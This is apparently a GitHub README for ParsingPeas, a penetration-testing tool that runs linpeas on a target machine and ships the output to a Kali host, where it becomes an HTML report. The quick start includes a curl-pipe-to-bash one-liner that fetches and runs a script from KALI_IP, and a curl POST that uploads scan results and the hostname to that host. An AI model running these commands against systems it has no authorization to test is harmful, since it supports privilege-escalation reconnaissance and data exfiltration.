# 🥒 ParsingPeas

**Automated linpeas/winpeas Output Transfer & Interactive HTML Parser**

ParsingPeas solves the annoying problem of manually transferring and parsing privilege escalation scan outputs. Run one command on the target, and automatically get a beautiful, searchable HTML report on your Kali host.

## Why ParsingPeas?

Existing PEASS parsers require manual file transfers (SCP, copy/paste, etc.), which breaks your workflow. ParsingPeas automates the entire pipeline:

```
🎯 Target → 🔄 Auto Transfer → 🖥️ Kali → 📊 Parse → 🌐 HTML Report
```

## Features

- ✅ **Automatic Transfer**: No manual file copying
- ✅ **Robust**: Handles large outputs, retries on failure
- ✅ **Interactive HTML**: Collapsible sections, search, highlighting
- ✅ **Critical Findings**: Auto-extracts important vulnerabilities
- ✅ **Multi-Session**: Handle multiple scans simultaneously
- ✅ **Clean**: Auto-removes temp files on target

## Quick Start

### 1. On Your Kali Host:

```bash
# Clone the repository
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas

# Install dependencies
pip3 install -r requirements.txt

# Start the receiver
python3 receiver.py
```

The server will start on `http://0.0.0.0:8000`

### 2. On Target Machine:

**One-liner (replace KALI_IP):**
```bash
curl -sSL http://KALI_IP:8000/get-script | bash
```

That's it! The script will:
1. Download linpeas automatically
2. Run the scan
3. Transfer output to your Kali host
4. Generate an HTML report
5. Clean up after itself

### 3. View Report:

Open your browser to `http://KALI_IP:8000` to see all generated reports.

## Architecture

```
┌─────────────────┐
│  Target Machine │
│                 │
│  wrapper.sh     │
│  ├─ Download    │
│  ├─ Run linpeas │
│  └─ HTTP POST   │
└────────┬────────┘
         │
         │ Chunked Transfer
         │ with Retries
         ▼
┌─────────────────┐
│   Kali Host     │
│                 │
│  receiver.py    │
│  ├─ Receive     │
│  ├─ Validate    │
│  └─ Trigger ────┐
└─────────────────┘
         │
         ▼
┌─────────────────┐
│   parser.py     │
│                 │
│  ├─ Parse       │
│  ├─ Extract     │
│  └─ Generate ───┐
└─────────────────┘
         │
         ▼
┌─────────────────┐
│  HTML Report    │
│  ├─ Searchable  │
│  ├─ Collapsible │
│  └─ Highlights  │
└─────────────────┘
```

## Manual Usage

### Run Linpeas and Transfer Manually:

```bash
# On target
./linpeas.sh > /tmp/output.txt

# Transfer to Kali
curl -X POST \
  -H "X-Hostname: $(hostname)" \
  -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/output.txt \
  http://KALI_IP:8000/upload
```

## Configuration

Edit `receiver.py` to customize:

- `OUTPUT_DIR`: Where raw outputs are saved
- `REPORTS_DIR`: Where HTML reports are generated
- `MAX_UPLOAD_SIZE`: Maximum upload size (default: 500MB)
- Port: Change port in the last line (default: 8000)

## Security Considerations

⚠️ **This tool is for authorized penetration testing only**

- The receiver has no authentication (use only in controlled environments)
- Run on isolated networks or VPN
- Consider adding authentication if needed
- The wrapper script downloads from GitHub (verify checksums in production)

## Roadmap

- [ ] Windows/WinPEAS support
- [ ] Better ANSI color parsing
- [ ] Integration with PEASS-ng JSON parsers
- [ ] Multi-language reports
- [ ] PDF export
- [ ] Comparison between multiple scans
- [ ] Authentication/encryption

## Contributing

Pull requests welcome! Areas that need work:
- WinPEAS wrapper
- Enhanced HTML parsing
- Better critical finding detection
- UI improvements

## License

MIT License - See LICENSE file

## Credits

Built on top of the excellent [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project.

---

**Made with 🥒 for lazy pentesters who hate manual file transfers**
